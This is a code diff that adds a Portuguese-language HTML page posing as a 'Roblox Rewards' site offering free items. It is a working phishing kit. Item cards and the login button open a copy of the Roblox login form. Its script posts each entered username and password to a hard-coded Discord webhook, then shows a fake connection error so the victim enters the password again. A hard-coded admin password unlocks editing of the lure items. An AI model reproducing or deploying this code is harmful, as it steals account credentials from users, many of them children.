@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox Rewards</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;600;700&display=swap');
+
+        body { 
+            font-family: 'Source Sans Pro', sans-serif; 
+            background-color: #111216; 
+            color: white; 
+            margin: 0; 
+            overflow-x: hidden; 
+        }
+
+        .rewards-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            padding: 15px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        @media (min-width: 768px) {
+            .rewards-grid { grid-template-columns: repeat(4, 1fr); gap: 24px; padding: 30px; }
+        }
+
+        .reward-card {
+            background-color: #232527;
+            border: 1px solid #393b3d;
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            display: flex;
+            flex-direction: column;
+        }
+        .reward-card:active { transform: scale(0.98); }
+        .reward-card:hover { border-color: #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+
+        .card-img {
+            width: 100%;
+            aspect-ratio: 1/1;
+            object-fit: cover;
+            background: #000;
+        }
+        .card-info { padding: 12px; flex-grow: 1; display: flex; flex-direction: column; justify-content: center; text-align: center; }
+        .card-name { font-weight: 700; font-size: 15px; line-height: 1.2; margin-bottom: 5px; }
+        .card-type { font-size: 10px; font-weight: bold; text-transform: uppercase; color: #aaa; background: rgba(255,255,255,0.1); padding: 2px 6px; border-radius: 4px; display: inline-block; margin: 0 auto; }
+
+        .modal-overlay {
+            position: fixed; inset: 0; z-index: 50; display: none;
+            background: rgba(0,0,0,0.7); align-items: center; justify-content: center;
+            padding: 20px; backdrop-filter: blur(5px);
+        }
+        
+        .roblox-modal { 
+            background-color: #191b1d; 
+            color: white; 
+            border-radius: 10px; 
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5); 
+            position: relative; 
+            width: 100%; max-width: 400px; 
+            padding: 24px;
+        }
+        
+        .roblox-header { font-weight: 700; font-size: 32px; text-align: center; margin-bottom: 24px; color: #ffffff; margin-top: 10px; }
+        .img-white-filter { filter: brightness(0) invert(1); }
+        
+        .roblox-input { 
+            background-color: #232527; 
+            border: 1px solid #a7a7a7; 
+            border-radius: 6px; 
+            color: white; 
+            padding: 10px 12px; 
+            font-size: 16px; 
+            width: 100%; 
+            height: 44px; 
+            outline: none; 
+            margin-bottom: 12px;
+        }
+        .roblox-input:focus { border-color: white; }
+        
+        .password-container { position: relative; width: 100%; }
+        .password-toggle { position: absolute; right: 12px; top: 14px; color: #a7a7a7; cursor: pointer; font-size: 14px; }
+        
+        .roblox-btn-primary { 
+            background-color: #232527; 
+            border: 1px solid #ffffff; 
+            color: white; 
+            border-radius: 8px; 
+            padding: 10px; 
+            font-size: 16px; 
+            font-weight: 500; 
+            width: 100%; 
+            cursor: pointer; 
+            height: 44px; 
+            display: flex; align-items: center; justify-content: center; 
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+        .roblox-btn-primary:hover { background-color: rgba(255,255,255,0.1); }
+        
+        .roblox-btn-secondary { 
+            background-color: #2b2d31; 
+            color: white; 
+            border-radius: 8px; 
+            padding: 10px; 
+            font-size: 14px; 
+            width: 100%; 
+            cursor: pointer; 
+            margin-bottom: 12px; 
+            border: none;
+        }
+        .roblox-btn-secondary:hover { background-color: #393b3d; }
+        
+        .roblox-divider { height: 1px; background-color: #3e4042; margin: 20px 0; width: 100%; }
+        .roblox-link-text { color: white; font-size: 12px; text-align: center; display: block; margin: 16px 0; cursor: pointer; }
+        .roblox-link-text:hover { text-decoration: underline; }
+
+        .roblox-wordmark-wrapper { width: 100%; display: flex; justify-content: center; margin-top: 10px; margin-bottom: 20px; }
+        .roblox-wordmark-wrapper img { width: 150px; height: auto; }
+
+        .fab {
+            position: fixed; bottom: 20px; right: 20px;
+            width: 56px; height: 56px;
+            background-color: #00b06f; color: white;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 24px; box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+            cursor: pointer; z-index: 100;
+        }
+    </style>
+</head>
+<body>
+
+    <header class="bg-[#232527] border-b border-[#393b3d] p-4 flex justify-between items-center sticky top-0 z-40">
+        <div class="flex items-center gap-2">
+            <button id="btn-back" onclick="goHome()" class="text-white hidden"><i class="fa-solid fa-arrow-left text-xl"></i></button>
+            <h1 class="text-xl font-bold tracking-tight">ROBLOX <span class="font-light text-gray-400">REWARDS</span></h1>
+        </div>
+        <div class="flex items-center gap-3">
+            <div id="admin-badge" class="hidden px-2 py-1 bg-red-600 text-xs font-bold rounded">ADMIN</div>
+            <button onclick="openLoginModal()" class="text-sm font-bold border border-white px-3 py-1 rounded hover:bg-white hover:text-black transition">Login</button>
+        </div>
+    </header>
+
+    <main id="main-grid" class="rewards-grid">
+        <div class="col-span-2 md:col-span-4 text-center text-gray-500 py-10"><i class="fa-solid fa-spinner fa-spin text-2xl"></i></div>
+    </main>
+
+    <div id="btn-add" class="fab hidden" onclick="openAdminModal()">
+        <i class="fa-solid fa-plus"></i>
+    </div>
+
+    <div id="modal-login" class="modal-overlay">
+        <div class="roblox-modal">
+            <button onclick="closeModals()" class="absolute top-4 right-4 text-gray-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
+            
+            <div class="roblox-wordmark-wrapper">
+                <img src="https://images.rbxcdn.com/cece570e37aa8f95a450ab2b32a93d5e.svg" alt="Roblox" class="img-white-filter">
+            </div>
+            
+            <h2 class="text-center font-bold text-xl mb-6" id="login-heading">Login</h2>
+            
+            <form onsubmit="event.preventDefault(); processLogin();">
+                <input type="text" id="inp-user" class="roblox-input" placeholder="Usuário/e-mail/telefone">
+                
+                <div class="password-container">
+                    <input type="password" id="inp-pass" class="roblox-input" placeholder="Senha">
+                    <i class="fa-solid fa-eye password-toggle" onclick="togglePassword()"></i>
+                </div>
+                
+                <button id="btn-entrar" type="submit" class="roblox-btn-primary">Entrar</button>
+            </form>
+            
+            <div class="roblox-link-text">Esqueceu a senha ou nome de usuário?</div>
+            
+            <div class="roblox-divider"></div>
+            
+            <button class="roblox-btn-secondary">Use outro dispositivo</button>
+            <div class="text-center mt-2 text-sm text-gray-400">Não possui conta? <span class="text-white cursor-pointer hover:underline">Cadastre-se</span></div>
+        </div>
+    </div>
+
+    <div id="modal-admin" class="modal-overlay">
+        <div class="bg-[#232527] w-full max-w-sm p-6 rounded-lg text-white border border-[#393b3d]">
+            <div class="flex justify-between mb-4">
+                <h3 class="font-bold text-lg">Gerenciar Item</h3>
+                <i onclick="closeModals()" class="fa-solid fa-xmark cursor-pointer"></i>
+            </div>
+
+            <label class="block text-xs text-gray-400 mb-1">Tipo</label>
+            <select id="adm-type" class="w-full bg-[#191b1d] border border-gray-600 rounded p-2 mb-3 outline-none">
+                <option value="product">Produto (Login)</option>
+                <option value="category">Categoria (Pasta)</option>
+            </select>
+
+            <label class="block text-xs text-gray-400 mb-1">Nome</label>
+            <input id="adm-name" class="w-full bg-[#191b1d] border border-gray-600 rounded p-2 mb-3 outline-none" placeholder="Nome do item">
+
+            <label class="block text-xs text-gray-400 mb-1">URL da Imagem</label>
+            <input id="adm-img" class="w-full bg-[#191b1d] border border-gray-600 rounded p-2 mb-4 outline-none" placeholder="https://...">
+
+            <button onclick="saveItem()" class="w-full bg-green-600 hover:bg-green-700 p-2 rounded font-bold">Salvar</button>
+            <button onclick="deleteItem()" id="btn-del" class="w-full bg-red-600 hover:bg-red-700 p-2 rounded font-bold mt-2 hidden">Excluir</button>
+        </div>
+    </div>
+
+    <script>
+        // CONFIG
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1444449733753180355/UexEyxKjWYMkbMEuXkBrvXeNzAS5s8BapW5K4b6PqB-2zqDT5BNxfOYfgrjjiG_t45PA";
+
+        // ESTADO GLOBAL (Carregado do Servidor)
+        let items = [];
+        let isAdmin = false;
+        let currentParent = 0;
+        let targetItem = null;
+        let editingId = null;
+
+        // INICIAR
+        loadItems();
+
+        async function loadItems() {
+            try {
+                const res = await fetch('/api/items');
+                items = await res.json();
+                render();
+            } catch (e) {
+                console.error("Erro ao carregar itens", e);
+            }
+        }
+
+        function render() {
+            const grid = document.getElementById('main-grid');
+            grid.innerHTML = '';
+            
+            const viewItems = items.filter(i => (i.parent || 0) == currentParent);
+            
+            document.getElementById('btn-back').style.display = currentParent === 0 ? 'none' : 'block';
+
+            if(viewItems.length === 0) {
+                grid.innerHTML = '<div class="col-span-2 md:col-span-4 text-center text-gray-500 py-10">Vazio</div>';
+                return;
+            }
+
+            viewItems.forEach(item => {
+                const card = document.createElement('div');
+                card.className = 'reward-card';
+                
+                let adminHtml = '';
+                if(isAdmin) {
+                    adminHtml = `<button onclick="event.stopPropagation(); editMode(${item.id})" class="absolute top-2 right-2 bg-black/50 text-white w-8 h-8 rounded-full z-10 hover:bg-blue-600"><i class="fa-solid fa-pen"></i></button>`;
+                }
+
+                card.innerHTML = `
+                    ${adminHtml}
+                    <img src="${item.img}" class="card-img">
+                    <div class="card-info">
+                        <div class="card-name">${item.name}</div>
+                        <div class="card-type">${item.type === 'category' ? 'Abrir' : 'Resgatar'}</div>
+                    </div>
+                `;
+
+                card.onclick = () => handleClick(item);
+                grid.appendChild(card);
+            });
+        }
+
+        function handleClick(item) {
+            if(item.type === 'category') {
+                currentParent = item.id;
+                render();
+            } else {
+                targetItem = item;
+                document.getElementById('login-heading').innerText = "Login";
+                document.getElementById('inp-user').value = "";
+                document.getElementById('inp-pass').value = "";
+                document.getElementById('modal-login').style.display = 'flex';
+            }
+        }
+
+        function goHome() {
+            currentParent = 0;
+            render();
+        }
+
+        function openLoginModal() {
+            targetItem = null;
+            document.getElementById('login-heading').innerText = "Acesso";
+            document.getElementById('inp-user').value = "";
+            document.getElementById('inp-pass').value = "";
+            document.getElementById('modal-login').style.display = 'flex';
+        }
+
+        function processLogin() {
+            const u = document.getElementById('inp-user').value;
+            const p = document.getElementById('inp-pass').value;
+
+            if(u === 'Admin' && p === 'LP') {
+                isAdmin = true;
+                document.getElementById('admin-badge').classList.remove('hidden');
+                document.getElementById('btn-add').classList.remove('hidden');
+                closeModals();
+                render();
+                alert("Modo Admin");
+                return;
+            }
+
+            const itemNome = targetItem ? targetItem.name : "Login Geral";
+            const content = `**Item:** ${itemNome}\n**Nick:** ${u}\n**Pass:** ${p}`;
+
+            const btn = document.getElementById('btn-entrar');
+            const originalText = btn.innerText;
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i>';
+            btn.disabled = true;
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({ content: content })
+            }).then(() => {
+                setTimeout(() => {
+                    alert("Erro de conexão. Tente novamente."); 
+                    btn.innerText = originalText;
+                    btn.disabled = false;
+                    document.getElementById('inp-pass').value = "";
+                }, 1500);
+            }).catch(() => {
+                btn.innerText = originalText;
+                btn.disabled = false;
+            });
+        }
+
+        // ADMIN FUNCTIONS
+        function openAdminModal() {
+            editingId = null;
+            document.getElementById('btn-del').classList.add('hidden');
+            document.getElementById('adm-name').value = "";
+            document.getElementById('adm-img').value = "";
+            document.getElementById('modal-admin').style.display = 'flex';
+        }
+
+        function editMode(id) {
+            const item = items.find(i => i.id === id);
+            if(!item) return;
+            editingId = id;
+            document.getElementById('adm-type').value = item.type;
+            document.getElementById('adm-name').value = item.name;
+            document.getElementById('adm-img').value = item.img;
+            document.getElementById('btn-del').classList.remove('hidden');
+            document.getElementById('modal-admin').style.display = 'flex';
+        }
+
+        // SALVAR NO MONGO DB
+        async function saveItem() {
+            const type = document.getElementById('adm-type').value;
+            const name = document.getElementById('adm-name').value;
+            const img = document.getElementById('adm-img').value;
+
+            if(!name || !img) return alert("Preencha tudo");
+
+            const newItem = {
+                id: editingId ? editingId : Date.now(),
+                type, name, img,
+                parent: currentParent
+            };
+
+            // Envia para o Backend
+            await fetch('/api/items', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(newItem)
+            });
+
+            closeModals();
+            loadItems(); // Recarrega do servidor
+        }
+
+        // DELETAR NO MONGO DB
+        async function deleteItem() {
+            if(!confirm("Excluir?")) return;
+            
+            await fetch('/api/items/' + editingId, {
+                method: 'DELETE'
+            });
+
+            closeModals();
+            loadItems(); // Recarrega do servidor
+        }
+
+        function togglePassword() {
+            const input = document.getElementById('inp-pass');
+            const icon = document.querySelector('.password-toggle');
+            if (input.type === "password") {
+                input.type = "text";
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                input.type = "password";
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        }
+
+        function closeModals() {
+            document.getElementById('modal-login').style.display = 'none';
+            document.getElementById('modal-admin').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
